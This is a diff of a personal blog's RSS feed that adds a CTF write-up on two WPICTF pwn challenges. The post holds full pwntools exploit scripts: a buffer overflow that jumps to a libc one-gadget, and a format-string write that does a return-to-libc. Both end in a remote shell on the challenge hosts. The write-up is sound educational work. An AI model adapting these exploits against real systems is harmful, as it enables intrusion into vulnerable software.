@@ -5,8 +5,200 @@
         <description>Recent content in Posts on Saurabh Mittal</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 05 Apr 2020 22:00:35 +0530</lastBuildDate>
+        <lastBuildDate>Mon, 20 Apr 2020 21:52:12 +0530</lastBuildDate>
         <atom:link href="https://saurabhmittal16.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>WPICTF pwn</title>
+            <link>https://saurabhmittal16.github.io/posts/2020/04/wpictf-pwn/</link>
+            <pubDate>Mon, 20 Apr 2020 21:52:12 +0530</pubDate>
+            
+            <guid>https://saurabhmittal16.github.io/posts/2020/04/wpictf-pwn/</guid>
+            <description>I participated in the WPICTF over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - dorsia1 and dorsia3.
+dorsia1 The source codes of some of the challenges were placed in a video.</description>
+            <content type="html"><![CDATA[
+
+<p>I participated in the <a href="https://ctf.wpictf.xyz/" target="_blank">WPICTF</a> over the weekend and it was a great experience. The challenges were fun and hard enough to keep things interesting. I solved a few challenges but the part that makes me happy is that I solved 2 out of the 4 pwn problems. In this post, I will explain how I solved the two pwns - <code>dorsia1</code> and <code>dorsia3</code>.</p>
+
+<h2 id="dorsia1">dorsia1</h2>
+
+<p>The source codes of some of the challenges were placed in a video. No binary was provided for this one. The problem description had the remote URL where the challenge was hosted and a hint which read</p>
+
+<blockquote>
+<p>Same libc as dorsia4, but you shouldn&rsquo;t need the file to solve</p>
+</blockquote>
+
+<p>Here is the source code from the video.</p>
+
+<div align='center'><img src="/static/dorsia1.png"/></div>
+
+<h3 id="first-thoughts">First Thoughts</h3>
+
+<p>First thoughts were to download the libc from <code>dorsia4</code> challenge. Also looking at the code, the use of <code>fgets</code> with <code>96</code> characters makes it clear that it&rsquo;s a buffer overflow. But since there is no binary provided, we might need to guess the padding to overwrite the return pointer. Also the binary prints the address of <code>system + 765772</code> which is different on every connection to the remote URL. This means that <code>ASLR</code> is enabled but this can be easily circumvented, the printed address can be used to get the <code>libc</code> base address. So, we can control the flow of the program but where to <em>redirect</em> the flow? I recently read about the conecpt of <code>one gadget RCE</code> and it seemed like a good oppurtunity to try it.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>After downloading the <code>libc</code> from <code>dorsia4</code>, I found the offset of <code>system</code> using <code>objdump</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S ./libc.so.6 | grep system
+000000000004f440 &lt;__libc_system@@GLIBC_PRIVATE&gt;:
+   4f443:       <span style="color:#ae81ff">74</span> 0b                   je     4f450 &lt;__libc_system@@GLIBC_PRIVATE+0x10&gt;</code></pre></div>
+<p>The offset of <code>system</code> is <code>0x4f440</code>. Here is the first snippet of the exploit script which connects to the remote and calculates the <code>libc</code> base address.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)
+
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f440</span>
+
+addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()
+addr_system <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">765772</span>
+
+libc_base <span style="color:#f92672">=</span> addr_system <span style="color:#f92672">-</span> system_offset
+<span style="color:#66d9ef">print</span>(hex(libc_base))</code></pre></div>
+<p>Now, for finding a <code>one gadget</code>, I used <a href="https://github.com/david942j/one_gadget" target="_blank">this tool</a>. Here is the output of <code>one_gadget</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
+0x4f2c5 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#f92672">)</span>
+constraints:
+  rsp &amp; 0xf <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
+  rcx <span style="color:#f92672">==</span> NULL
+
+0x4f322 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span style="color:#f92672">)</span>
+constraints:
+  <span style="color:#f92672">[</span>rsp+0x40<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+
+0x10a38c execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span style="color:#f92672">)</span>
+constraints:
+  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL</code></pre></div>
+<p>You can see the constraints that need to be met for that gadget to work. I decided to use <code>0x4f322</code> since the chances of <code>[rsp+0x40]</code> being <code>NULL</code> were high. The address of the gadget can be calculated by adding this offset to the base address. This is all we need to solve this challenge. The padding value had to be guesses but it was obviously greater than <code>69</code> and <code>77</code> worked. Here is the final script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia1.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)
+
+addr <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()
+
+addr_system <span style="color:#f92672">=</span> int(addr, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">765772</span>
+
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f440</span>
+one_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4f322</span>
+
+libc_base <span style="color:#f92672">=</span> addr_system <span style="color:#f92672">-</span> system_offset
+one_gadget <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> one_offset
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">77</span>
+payload <span style="color:#f92672">+=</span> p64(one_gadget)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#75715e"># get shell</span>
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>Done. Solved.</p>
+
+<h2 id="dorsia3">dorsia3</h2>
+
+<p>In this challenge, both the binary and the libc was provided. The same video had the source code for this challenge too. Here is the source code.</p>
+
+<div align='center'><img src="/static/dorsia3.png"/></div>
+
+<h3 id="first-thoughts-1">First Thoughts</h3>
+
+<p>First thoughts were that, since this uses <code>printf</code>, it&rsquo;s a format string vulnerability. The binary prints two addresses - the address of the beginning of character array <code>a</code> and the address of <code>system</code>. This binary had <code>ASLR</code> and <code>PIE</code> enabled too which means the addresses printed by the binary were important.</p>
+
+<p>Due to <code>printf</code>, we have arbitrary write but what to write and where? First idea was to overwrite <code>GOT</code> entries but due to <code>PIE</code>, the binary would be loaded in a different memory region every time and finding <code>GOT</code> or <code>PLT</code> entries would be impossible. We could leak some addresses from <code>printf</code> and get the base address but we only have one <code>printf</code> and we can&rsquo;t read and write using the same query. The next idea was to overwrite the return pointer in stack to control the flow and maybe redirect to <code>one gagdet</code>. But this approach didn&rsquo;t work because the constraints of <code>one gadgets</code> found, required that the <code>GOT</code> address of <code>libc</code> be in <code>ESI</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc.so.6
+0x3d0d3 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, esp+0x34, environ<span style="color:#f92672">)</span>
+constraints:
+  esi is the GOT address of libc
+  <span style="color:#f92672">[</span>esp+0x34<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL</code></pre></div>
+<p>I guess it means that the base address of <code>libc</code> should be in <code>ESI</code> but it doesn&rsquo;t matter because for placing values in registers, we would have to build a ROP chain but the available buffer is only <code>69</code> characters. But we have the address of <code>libc</code>, maybe we could perform a <code>return-to-libc</code>. For this, we need the address of the saved return pointer - <code>EIP</code> and also the address of the string <code>/bin/sh</code> in the given <code>libc</code>.</p>
+
+<h3 id="exploit-1">Exploit</h3>
+
+<p>The first thing I did was find the offset for <code>/bin/sh</code> in the <code>libc</code>. Here&rsquo;s a simple trick to find the required string in the binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -t x -a ./libc.so.6 | grep <span style="color:#e6db74">&#39;/bin/sh&#39;</span></code></pre></div>
+<p>Using this the offset is found to be <code>17e0cf</code>. Next step was to find the saved <code>EIP</code>. This is where the printed addresses are used. The first address is the address of beginning of <code>a</code>. Using <code>gdb</code> and running the binary locally, it can be easily calculated that the return address is <code>113</code> bytes after the address of <code>a</code>. Here is a snippet of the script that calculates all required addresses.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># space between string beginning and return pointer</span>
+diff <span style="color:#f92672">=</span> <span style="color:#ae81ff">113</span>
+
+<span style="color:#75715e"># system offset</span>
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d200</span>
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./nanoprint&#39;</span>, env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc.so.6&#34;</span>})
+
+lin <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;0x&#39;</span>)
+<span style="color:#75715e"># stack address</span>
+local <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+<span style="color:#75715e"># libc address</span>
+system <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">288</span>
+
+libc_base <span style="color:#f92672">=</span> system <span style="color:#f92672">-</span> system_offset
+jump <span style="color:#f92672">=</span> local <span style="color:#f92672">+</span> diff
+
+binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e0cf</span>
+binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset</code></pre></div>
+<p>The next part was to find out at what position is our input present on the stack. Passing a simple <code>AAAA%x,%x,%x,%x,%x,%x,%x,%x</code> type string reveals that <code>AAAA</code> is the seventh value on the stack. This means we can access the value at the beginning of our format string using the seventh argument. If you are not familiar with how format string exploits work, I would recommend <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4" target="_blank">this</a> video. The final step was to find the correct spacing to write the exact values on the desired address. After hours of hit and trial, I decided to use a little mathematics and make it easier.</p>
+
+<p>Here is a simple function I wrote that takes an address in hex and splits it into two values that can be written at the required address and the address 2 bytes from it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
+	<span style="color:#75715e"># example nhex = f7d99200</span>
+	nhex <span style="color:#f92672">=</span> hex(num)[<span style="color:#ae81ff">2</span>:]
+
+	first <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>)
+	second <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">4</span>:], <span style="color:#ae81ff">16</span>)
+
+	<span style="color:#66d9ef">return</span> first, second
+	<span style="color:#75715e"># returns 0xf7d9, 0x9200</span></code></pre></div>
+<p>Using this, I split the <code>libc</code> and <code>/bin/sh</code> addresses in two halves and added/subtracted the extra characters that were getting printed. Here is the final script which gives a shell on the remote server.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_halves</span>(num):
+	nhex <span style="color:#f92672">=</span> hex(num)[<span style="color:#ae81ff">2</span>:]
+	first <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>)
+	second <span style="color:#f92672">=</span> int(nhex[<span style="color:#ae81ff">4</span>:], <span style="color:#ae81ff">16</span>)
+
+	<span style="color:#66d9ef">return</span> first, second
+
+<span style="color:#75715e"># space between string beginning and return pointer</span>
+diff <span style="color:#f92672">=</span> <span style="color:#ae81ff">113</span>
+<span style="color:#75715e"># system offset</span>
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d200</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;dorsia3.wpictf.xyz&#39;</span>, <span style="color:#ae81ff">31337</span>)
+
+lin <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;0x&#39;</span>)
+<span style="color:#75715e"># stack address</span>
+local <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+<span style="color:#75715e"># libc address</span>
+system <span style="color:#f92672">=</span> int(lin[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">288</span>
+
+libc_base <span style="color:#f92672">=</span> system <span style="color:#f92672">-</span> system_offset
+jump <span style="color:#f92672">=</span> local <span style="color:#f92672">+</span> diff
+
+binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e0cf</span>
+binsh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset
+
+first, second <span style="color:#f92672">=</span> get_halves(system)
+b, h <span style="color:#f92672">=</span> get_halves(binsh)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>
+payload <span style="color:#f92672">+=</span> p32(jump)
+payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
+payload <span style="color:#f92672">+=</span> p32(jump<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(second<span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%7$n&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(first <span style="color:#f92672">-</span> second), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%8$n&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(<span style="color:#ae81ff">0x10000</span> <span style="color:#f92672">+</span> h <span style="color:#f92672">-</span> first), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%9$n&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> bytes(str(b <span style="color:#f92672">-</span> h), encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%10$n&#39;</span>
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>These are the solutions of the two pwn problems I was able to solve. I realise that the first problem could be solved without downloading the <code>libc</code>, so I would try to solve it without that too if the challenge binaries are released. In the end, I enjoyed working on these challenges and it was a great CTF overall. Thanks for reading. Cheers!</p>
+]]></content>
+        </item>
         
         <item>
             <title>ROP Emporium - Pivot Writeup</title>
